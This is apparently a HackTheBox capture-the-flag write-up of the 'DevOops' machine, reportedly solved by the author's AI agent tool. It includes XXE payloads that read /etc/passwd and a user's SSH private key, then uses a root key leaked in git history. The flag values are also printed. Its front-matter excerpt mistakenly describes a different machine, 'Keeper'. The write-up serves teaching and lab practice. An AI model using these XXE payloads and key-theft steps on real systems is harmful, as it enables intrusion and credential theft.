---
title: "HTB DevOops: From Uploads to Root"
date: 2026-02-14
excerpt: "A walkthrough of the HackTheBox Keeper machine. Default credentials, KeePass memory dumps, and a straightforward path to root."
tags:
  - ctf
  - hacking
  - htb
  - ai
---

## Overview

DevOops is a medium difficulty box with a vulnerable python library. This is a unique write-up (one the ones blocked by Medium) fully done by AI. The actual solving of the machine and hacking was performed by a tool I have been developing the last couple of months. Minimal human interference was needed, the interference that **DID** happen, was mainly working around application infra that hardstuck the agents, like creating a file and hanging commands. These were mostly done to save my wallet as this is a passion project funded straight from my own bank account.

**Difficulty**: Medium
**OS**: Linux
**Skills**: Enumeration, XXE, Data Exfiltration

## Hacking DevOops: From XXE to Root

A walkthrough of exploiting a vulnerable Python web application to achieve full system compromise


In this engagement, we targeted a single machine at 10.129.5.169 with no prior knowledge of what services were running. Following standard penetration testing methodology, we progressed from initial reconnaissance through to full root access. The attack chain leveraged an XXE vulnerability to extract SSH credentials, and a classic git history mistake to escalate to root.

---

## Phase 1: Reconnaissance

We started with a comprehensive TCP port scan using nmap with service detection:

```bash
nmap -sV -sC -p- 10.129.5.169
```

The scan revealed a minimal attack surface:

- Port 22 — SSH (OpenSSH 7.2p2 Ubuntu)
- Port 5000 — HTTP (Gunicorn 19.7.1)

The SSH version (7.2p2) is outdated with known vulnerabilities like CVE-2018–15473 (username enumeration), but direct SSH exploitation is typically low-yield. The more interesting target was the Python web application running on port 5000.

---

## Phase 2: Web Application Enumeration

The Gunicorn server was hosting a Python application called "<mark>Blogfeeder</mark>" (feed.py). Initial reconnaissance revealed:

- An _/upload_ endpoint accepting file uploads
- A _/feed_ endpoint that processes XML data
- References to an external backend at "<mark>dev.solita.fi</mark>"
- "Under construction" messaging suggesting a development instance
- The combination of XML processing and file upload functionality immediately suggested testing for XML External Entity (XXE) injection.

---

## Phase 3: Exploiting XXE

We crafted a malicious XML payload to test for XXE on the /upload endpoint:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <Author>&xxe;</Author>
  <Subject>Test</Subject>
  <Content>Test Content</Content>
</data>
```

Success! The application parsed the external entity and returned the contents of /etc/passwd:

```bash
root:x:0:0:root:/root:/bin/bash
...
roosa:x:1002:1002::/home/roosa:/bin/bash
git:x:1001:1001::/home/git:/bin/bash
```

We identified two interesting users: roosa (likely the application owner) and git.

## Extracting SSH Keys

With arbitrary file read confirmed, we escalated the attack by targeting SSH private keys:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">
]>
<data>
  <Author>&xxe;</Author>
  <Subject>Test</Subject>
  <Content>Test Content</Content>
</data>
```

The server returned roosa's complete RSA private key. We saved it locally and connected:

```bash
chmod 600 roosa_key
ssh -i roosa_key roosa@10.129.5.169
```

Initial foothold achieved.

---

## Phase 4: Privilege Escalation

Once on the box as roosa, we began enumeration:

```bash
id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

The user was in the sudo group, which was promising but would require a password we didn't have.

## Digging Through Git History


Exploring roosa's home directory, we found a git repository at /home/roosa/work/blogfeed/. Examining the commit history revealed something interesting:

```bash
git log --oneline
```

One commit message stood out: "reverted accidental commit with proper key"

This is a classic mistake. When developers accidentally commit secrets and then "revert" them, the sensitive data remains in git history. We examined the old commit:

```bash
git show d387abf
```

Jackpot. The commit contained an RSA private key that was different from the current one. Given the commit message about "proper key," we theorized this might be the root SSH key.

## Root Access

We extracted the key from git history and tested it:

```bash
ssh -i root_key root@10.129.5.169

root@devoops:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Full root access achieved.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | /home/roosa/user.txt | f7c0b790fb5a8a2252529b0d12d63c12 |
| Root | /root/root.txt | 7b3bd18851a14b030d1eff4ee4057a65 |


## Attack Chain Summary
```centered
Port Scan
↓
Web App on :5000 (Gunicorn/Python)
↓
XXE on /upload endpoint
↓
Arbitrary File Read → /home/roosa/.ssh/id_rsa
↓
SSH as roosa
↓
Git history analysis → leaked root SSH key
↓
SSH as root
↓
GAME OVER
```

## Key Vulnerabilities

| Vulnerability | Severity | Impact |
|---------------|----------|--------|
| XML External Entity (XXE) Injection | Critical | Arbitrary file read from filesystem |
| Sensitive Data in Git History | Critical | Root SSH private key exposed |


## Remediation Recommendations

Disable External Entity Processing
- Configure the XML parser to disallow DTDs and external entities. In Python's lxml: 
```python
parser = etree.XMLParser(resolve_entities=False)
```

Scrub Git History
- Use git filter-branch or BFG Repo-Cleaner to permanently remove secrets. Force-push the cleaned history.

Rotate All Credentials
- Generate new SSH keys for all users. Revoke the compromised keys.

Implement Pre-Commit Hooks
- Use tools like git-secrets or trufflehog to prevent credentials from being committed.

Upgrade Software
- OpenSSH 7.2p2 is outdated; upgrade to a current version. Keep all server software patched.


## Lessons Learned

This box demonstrates two common but critical mistakes:

Trusting user input in XML parsers — XXE remains a prevalent vulnerability, especially in applications that process XML uploads or feeds. Always disable external entity processing unless explicitly required.

Thinking "git revert" removes secrets — Git never forgets. Once something is committed, it lives in history forever unless explicitly purged. Developers must understand that reverting a commit does not delete the sensitive data.

The attack chain from XXE to root was straightforward once the initial vulnerability was found. This highlights how a single weakness in a web application can lead to complete system compromise.


Happy hacking! 🎯